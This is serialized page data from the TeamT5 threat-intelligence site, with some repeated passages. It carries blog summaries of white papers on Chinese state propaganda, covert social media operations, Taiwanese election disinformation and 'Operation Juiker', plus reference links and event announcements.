digital influence did not scale down even in the times of the pandemic. Instead, the regime took the opportunity to pose itself as a global leader more capable than the US. We can see that the CCP has well mastered its cyber capabilities and propaganda machine, expanding the regime's control from physical entities to public opinion. Moreover, the CCP has elevated its efforts to shape international opinion through the Twitter platform. We assess that the CCP will have more power of discourse and influence after they learned to conduct propaganda campaign on foreign social media platforms, and every party should be vigilant about it.\n\n### Reference\n\n\\[1\\] 工业和信息化部办公厅关于做好疫情防控期间信息通信行业网络安全保障工作的通知 (MIIT's Notice on Cybersecurity Practice for Information and Communications Technology (ICT) Service Providers During Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7681785/content.html\n\n\\[2\\] 工业和信息化部召开媒体通气会 介绍电信大数据分析、支撑服务疫情防控总体情况 (MIIT's Media Briefing on the Utilization of Telecom Big Data Analysis on Epidemic Control)  \nhttp://www.miit.gov.cn/n1146290/n1146402/c7678438/content.html\n\n\\[3\\] 健康码的隐私政策还有哪些改进空间？(Room of Improvement on the Health Code System's Privacy Policy)  \nhttps://www.jiemian.com/article/4120372.html\n\n\\[4\\] 美国暴发40年来最致命流感 已有6600人死亡 (US' Worst Influenza Outbreak in 40 Years, 6600 Americans Killed)  \nhttp://news.sina.com.cn/w/2020-01-22/doc-iihnzhha4088647.shtml\n\n\\[5\\] https://s.weibo.com/weibo?q=%23美国爆发乙型流感%23\u0026Refer=SWeibo_box\n\n\\[6\\] CGTN: Time lapse video: Construction of Wuhan Huoshenshan Hospital completed  \nhttps://www.youtube.com/watch?v=53nhErXUd9A\n\n\\[7\\] 中国人民\"正在为全人类作贡献\" (Chinese People are Contributing for All Human Kind)  \nhttp://world.people.com.cn/n1/2020/0308/c1002-31622166.html\n\n\\[8\\] Xinhua Net: China deserves appreciation for efforts, sacrifices in fighting epidemic: WHO chief  \nhttp://www.xinhuanet.com/english/2020-02/16/c_138789289.htm\n\n\\[9\\] How China unleashed Twitter bots to spread COVID-19 propaganda in Italy  \nhttps://formiche.net/2020/03/china-unleashed-twitter-bots-covid19-propaganda-italy/\n\n\\[10\\] https://twitter.com/SpokespersonCHN/status/1239041044580188162  \nhttps://twitter.com/zlj517/status/1239112822908276736  \nCGTN: Italians play Chinese national anthem to thank China for its aid  \nhttps://www.youtube.com/watch?v=8ZKsA2jbwlk  \nCCTV: Italians play Chinese national anthem, chanting \"Grazie Cina\"  \nhttps://www.facebook.com/watch/?v=201784281098386\n\n\\[11\\] https://twitter.com/zlj517/status/1238111898828066823\n\n\\[12\\] Coronavirus may have existed in Italy since November: local researcher  \nhttps://news.cgtn.com/news/2020-03-22/Coronavirus-may-have-existed-in-Italy-since-November-local-researcher-P4i2As2OAg/index.html\n\n\\[13\\] Italian doctors saw strange pneumonia cases before China's COVID-19 outbreak, report says   \nhttp://www.china.org.cn/world/Off_the_Wire/2020-03/22/content_75845579.htm\n\n\\[14\\] 'Every Single Individual Must Stay Home': Italy's Coronavirus Surge Strains Hospitals  \nhttps://www.npr.org/2020/03/19/817974987/every-single-individual-must-stay-home-italy-s-coronavirus-deaths-pass-china-s?t=1585131614833\n\n\\[15\\] Beijing twisted my words on coronavirus's Italian origin, says scientist Giuseppe Remuzzi  \nhttps://www.thetimes.co.uk/article/beijing-twisted-my-words-on-coronaviruss-italian-origin-says-scientist-giuseppe-remuzzi-6twwhkrvn","createdAt":"2020-05-24T17:56:37.931Z","updatedAt":"2020-07-02T09:41:31.546Z","__v":0,"id":"5ecab555602fc90040476054"}],"createdAt":"2020-05-24T17:56:37.926Z","updatedAt":"2021-01-08T06:55:16.343Z","__v":1,"topic":"5ecaa02ba792d70040a0d8b3","author":"5eeae9e3163518003f86d917","publish_date":"2020-04-21T02:00:00.000Z","id":"5ecab555602fc90040476053"},{"publish":true,"enable_form":true,"tags":["5f0e5b52163518003f86d983","5f0e6732163518003f86d9aa","5f0e6743163518003f86d9ab","5ecf6ceefedd7f004b26974a","5f0e6315163518003f86d9a9"],"relative_posts":["5ecab44c602fc90040476047","602e177fc56e80003f985a0e","5f866d3ada3440005757a928"],"_id":"5f0e5aad163518003f86d97e","post_url":"teamt5-information-operation-white-paper-china-s-digital-propaganda-formula-inside-the-great-firewall","post_name":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1594807939/1920_1280_1920-1280_%E8%A4%87%E6%9C%AC_3_4730f822ca.jpg","contents":[{"locale":"en","_id":"5f0e5aae163518003f86d97f","title":"TeamT5 Information Operation White Paper (Part 2 of 3): China’s Digital Propaganda Formula inside the Great Firewall","context":"To confront the emerging threat of China's Information Operation, TeamT5 threat intelligence team publishes this White Paper covering how China conduct information manipulation across Chinese social media platforms. From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"}],"id":"5ecaa02ba792d70040a0d8b3"},"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"}],"_id":"5ecab44c602fc90040476047","post_url":"teamt5-information-operation-white-paper-observations-on-2020-taiwanese-general-elections","post_name":"TeamT5 Information Operation White Paper: Observations on 2020  Taiwanese General Elections","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590342706/info_ops_part1_blog_cover_ad439b498b.jpg","contents":[{"locale":"en","_id":"5ecab44c602fc90040476048","title":"TeamT5 Information Operation White Paper: Observations on 2020 Taiwanese General Elections","context":"The ubiquity of social media has altered the way people consume information, which in turn dramatically changed the way electoral campaigns are run. From the 2018 municipal elections to the 2020 general elections, Taiwan has witnessed the growing threat of disinformation to the citizens. It was observed that many malicious actors utilized social media to disseminate a huge amount of fake news, false information, and hate speech. These disinformation are like highly contagious viruses that will not only affect the people consuming them, but also make them secondary disseminators. We assess that:\n\n1. Virus-like disinformation makes everyone on social media both victim and disseminator\n\n   Although public discussion is the cornerstone of a good democratic society, many attacks have used voter enthusiasm to spread on social media. We have observed that many of the voters who participated in the discussion turned out to be the source of dissemination.\n2. Disinformation continues to evolve in tactics and quantity, as well as expanding its targets\n\n   The Taiwanese Central Election Commission (CEC) stated that the number of disinformation cases before the 2020 elections reached an unprecedented level. In addition to the evolution in quantity and tactics, we observed that the dissemination of disinformation did not stop even after the election, but instead shifted the target.\n3. China continues to increase its influence\n\n   Apart from news agency promoting the Chinese policies, inauthentic accounts run by bot, and patriotic netizens (A.K.A little pink), China has stepped up its influence on social media platforms to shape narratives.\n4.

From the 2019 Hong Kong Protest to the 2020 COVID-19 pandemic, China has demonstrated the art of surveillance, censorship, and most importantly, digital propaganda.\n\nIn this white paper, we focus on China's digital propaganda inside the Great Firewall. We suggest that the regime has developed a unique, organizational, and sophisticated propaganda mechanism, which we dub as \"digital propaganda formula.\" With this formula, the Chinese Communist Party (CCP) has managed to transform all the Chinese social media platforms inside the Great Firewall into an almost total pro-CCP environment.\n\n#### Key Takeaways\n\n1. CCP has strengthened its control over Chinese cyberspace by establishing legislations as well as centralizing administrations, and the \"last mile\" of its cyber governance is to control public opinion through censorship and digital propaganda.\n\n2. We dub China's sophisticated propaganda mechanism the \"digital propaganda formula,\" which consists of state media, communist youth league, governmental affairs new media, as well as trolling factory.\n\n3. Moreover, CCP's policies have bolstered the industry of \"public opinion guidance\" in China. The industry practitioners have developed AI and big data-powered systems to help the government to collect, store, and analyze public sentiment.\n\n4. China's formula has polluted the online information environment inside the Great Firewall. We assess that the CCP is trying to project its digital propaganda dominance to foreign social media platforms in order to control the world's discourse power. \n\nFollowing the global pandemic, the world relies on the internet more than ever. Cyber threat actors and influence operators, either state-backed or money driven, are taking the advantage to conduct information operation.

The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks.

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"},{"publish":true,"enable_form":false,"tags":["5f979c701d1f9c004b931d5a","5eec125f163518003f86d920","5eec1394163518003f86d929","5f979c9e1d1f9c004b931d5c"],"relative_posts":["5ecab44c602fc90040476047","5f0e5aad163518003f86d97e","5f866d3ada3440005757a928"],"_id":"5f9788f11d1f9c004b931d3e","post_name":"TeamT5 Exhibits at “CODE BLUE 2020” Virtual Event","post_url":"teamt5-exhibits-at-code-blue-2020-virtual-event","publish_date":"2020-10-27T06:00:00.000Z","contents":[{"locale":"en","_id":"5f9788f11d1f9c004b931d3f","title":"TeamT5 Exhibits at \"CODE BLUE 2020\" Virtual Event","context":"*Image courtesy of CODE BLUE from https://codeblue.jp/2020/en/\n\nCODE BLUE 2020 is held online for two days on October 29th and 30th due to the COVID-19 pandemic.

Mobilizing Public Opinion Manipulation And APT Group","context":"The Chinese government has expanded its information warfare to the highest level in the past. It has been confirmed that even the Chinese government-supported Advanced Persistent Threat (APT) hacking organization has been mobilized to manipulate public opinion such as disseminating fake news. APT organizations have gone beyond intelligence warfare. This is the first time that it has been confirmed that they have participated in public opinion.\n\nAccording to a report released by Taiwanese threat intelligence company TeamT5 at the recent SANS Summit, false accounts opened on social network service (SNS) platforms such as Facebook, Google (YouTube), and Twitter have been investigated at an all-time high.\n\nTeamT5 made this statement based on the number of closed accounts published on each SNS platform. Google said it had removed 186 YouTube channels that are estimated to be involved in the Chinese information war in the second quarter of last year.\n\nThe Chinese government is known to hold a pro-Chinese content and dissemination of false facts, which are known to be engaged in a defensive public opinion battle that includes state-run media and spam botnets while creating false accounts to create favorable public opinion. The number of Facebook pages used by The New York Times, CNN, and BBC pages exceeded the number of followers two years ago. As of April 2019, the number of followers on CGTN's Facebook page, the Chinese state media, was 75 million, while The New York Times, CNN, and BBC had 50 million each. \n\nIt wasn't even crazy. Targeting Taiwan, which the Chinese government observes, the APT hacking organization used \"Juiker\" to spread false information, which is a popular SNS platform used in Taiwan like KakaoTalk.\n\nTeamT5 said, \"The APT Group is an organization that focuses on espionage and information stealing, and the fact that they are mobilized in information warfare means that the Chinese government is putting all efforts into information warfare,\" and \"It is urgent,\" TeamT5 CTI analyst Che Chang warned.\n\nThe Chinese government turned out to build a system tool that monitors public opinion using Big Data and Artificial Intelligence (AI) technology, a system that can monitor not only domestic social media but also sensitive websites distributed abroad.\n\nTeamT5 is a security company founded by APT experts. It tracks and monitors versions between the Chinese government and supplies threat intelligence to Asia-Pacific regions such as Taiwan and Japan.\n\n[Read more](https://www.etnews.com/20210215000176)\n\n\u003cbr\u003e\n","__v":0,"id":"602e1c9fc56e80003f985a11"}],"createdAt":"2021-02-18T07:30:07.989Z","updatedAt":"2021-06-02T05:41:47.631Z","__v":0,"publish_date":"2021-02-15T04:00:00.000Z","author":"5eec3483163518003f86d943","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1613634738/SANS_1_a4937cc174.png","topic":"5ecaa036a792d70040a0d8b4","id":"602e177fc56e80003f985a0e"}],"id":"5ecab44c602fc90040476047"}},"__N_SSG":true},"page":"/[lang]/posts/[uid]","query":{"lang":"en","uid":"teamt5-information-operation-white-paper-observations-on-2020-taiwanese-general-elections"},"buildId":"yZH7uzr0jnSd-VRHt_pM1","runtimeConfig":{"env":"production","baseUrl":"https://teamt5.org/","cmsUrl":"https://official-cms.teamt5.net/"},"isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html></html>
